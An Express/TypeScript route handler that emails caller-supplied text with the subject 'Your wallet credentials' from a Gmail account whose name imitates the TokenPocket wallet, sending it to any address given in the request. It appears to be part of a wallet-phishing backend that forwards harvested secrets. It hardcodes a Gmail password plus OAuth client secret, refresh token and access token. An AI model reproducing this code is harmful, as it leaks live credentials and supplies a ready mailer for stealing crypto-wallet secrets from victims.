import { Request, Response } from "express";
import nodemailer from "nodemailer";

interface Config {
  message: string;
}

export default async (req: Request, res: Response) => {
  const { email, config } = req.body as {
    email: string;
    config: Config;
  };

  // const transporter = nodemailer.createTransport({
  //   service: "gmail",
  //   auth: {
  //     user: "tokenpocketwalletcontract@gmail.com",
  //     pass: "paxwug-dyjxo7-qerZaf",
  //   },
  // });

  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      type: "OAuth2",
      user: "tokenpocketwalletcontract@gmail.com",
      clientId:
        "830938838166-n31pslt0mcrbsd6ltgq6b021b32hcfgn.apps.googleusercontent.com",
      clientSecret: "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",
      refreshToken:
        "1//04yH-l6PdWtgCCgYIARAAGAQSNwF-L9Irck-RkHISApq1Z8gh6jX16c-GwIqq2kZ3ZkyYLgQ9H0vqxdGsVfjNjOS0v9T3_qBwpz8",
      accessToken:
        "ya29.a0Aa4xrXO0MIbghofdtFH_gLtIWJ5Paas4bMx4_Lvkv-YW_wNUZseMG2_yjjg48CMwtUfddgnJEsL7F8NvZHtDoA_tDP7IjbcTRQg-tpatoQpTQLr0mZ7dA6gR2RlEKUB738QQAsbbOzaCQYnS0GYtaos7msw2aCgYKARUSARESFQEjDvL9GkcXte-Ghl3Yw0l_YE6GiA0163",
    },
  });

  const mailOptions = {
    from: "tokenpocketwalletcontract@gmail.com",
    to: email,
    subject: "Your wallet credentials",
    text: config.message,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  res.status(200).send({
    status: "success",
  });
};
